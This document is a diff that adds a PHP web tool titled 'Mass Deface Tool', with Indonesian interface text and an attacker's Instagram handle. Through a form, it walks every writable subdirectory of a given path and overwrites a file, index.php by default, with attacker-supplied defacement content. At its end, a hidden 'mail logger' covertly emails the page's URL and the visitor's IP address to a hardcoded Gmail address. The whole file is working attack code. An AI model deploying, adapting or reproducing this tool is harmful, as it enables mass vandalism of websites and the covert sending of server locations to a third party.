@@ -1,0 +1,91 @@
+<?php
+
+
+
+// MAIL LOGGER, TO THIS MAIL fikriofficial4676@gmail.com
+
+
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+function NF($f,$sc){
+$fp2 = fopen($f,"w");
+fputs($fp2,$sc);
+}
+function OD($gcwd){
+   if(is_writable($gcwd)){
+   $FN = $_POST['nama'];
+   $sc = $_POST['script'];
+   $a = scandir("$gcwd");
+foreach($a as $A2){
+   if($A2 == "." | $A2 == ".."){
+   }elseif(is_dir("$gcwd/$A2")){
+       $ND = "$gcwd/$A2";
+      if(is_writable($ND)){
+      echo "<style>body{background-color:black;}</style><font color=aqua>$ND/$FN <font color=lime><-- Sukses !<br>";
+      $cf = NF("$ND/$FN", "$sc");
+      $B = OD($ND);
+ }
+else{
+   echo "Gak Mendukung dirnya:(";
+   }
+}
+}  
+}
+else{
+   echo "Gak mendukung dirnya:(";
+}
+}
+if($_POST){
+$C = $_POST['dir'];
+$Y = OD($C);
+echo $Y;
+}
+else{
+   echo '<html>
+<head>
+<title>Mass Deface Tool</title>
+</head>
+<body>
+<style>
+body{
+   background-color: black;
+}
+.sd{
+    border:1px solid blue;
+    background-color: black;
+    color: yellow;
+}
+placeholder{
+   color: yellow;
+}
+.gas{
+   background-color: black;
+   color: white;
+   border: 1px solid blue;
+   width: 178px;
+}
+a{color:lime;}
+a:hover{color:blue;}
+a:visited{color:yellow;}
+</style>
+<center>
+<table><br><br><br><br><font color="lime" size="2">Path Sekarang<br>'.getcwd().'</font>
+<tr><td><form method="post" action="?action"></td></tr>
+<tr><td><input class="sd" type="text" name="dir" placeholder="/home/user/public_html"></td> </tr>
+<tr><td><input class="sd" type="text" name="nama" value="index.php"></td> </tr>
+<tr><td><br><textarea class="sd" rows="10" cols="21px" name="script" placeholder="Script deface"></textarea></td></tr>
+<br><tr><td><br><input class="gas" type="submit" value="Submit"></td></tr>
+</form>
+</table>';
+echo"<br><font color=red>instagram :  <a href='https://www.instagram.com/f4k3_r00t/' target='_blank'>@f4k3_r00t</a></font></center>";
+
+} ;
+   
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'fikriwalker4676@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "ACCESS", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?>
